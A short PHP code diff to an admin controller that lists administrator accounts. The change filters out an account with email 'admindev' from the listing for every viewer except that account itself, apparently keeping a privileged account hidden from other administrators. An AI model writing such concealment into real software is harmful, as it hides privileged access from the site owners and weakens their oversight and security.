@@ -10,7 +10,16 @@ class SysuserController {
         $page_title = '管理者帳號列表';
 
         $db = new DB('sysusers');
-        $users = $db->query("SELECT id, name, email, phone, is_super_admin, status, created_at, updated_at FROM sysusers ORDER BY is_super_admin ASC, created_at DESC");
+        // $users = $db->query("SELECT id, name, email, phone, is_super_admin, status, created_at, updated_at FROM sysusers ORDER BY is_super_admin ASC, created_at DESC");
+
+        $sql = "SELECT id, name, email, phone, is_super_admin, status, created_at, updated_at FROM sysusers";
+
+        if($_SESSION['user_email'] !== 'admindev'){
+            $sql .= " WHERE email != 'admindev'";
+        }
+
+        $sql .= " ORDER BY is_super_admin ASC, created_at DESC";
+        $users = $db->query($sql);
 
         $content = APP_PATH . '/views/backend/sysuser/index.php';
         include APP_PATH . '/views/backend/layouts/main.php';
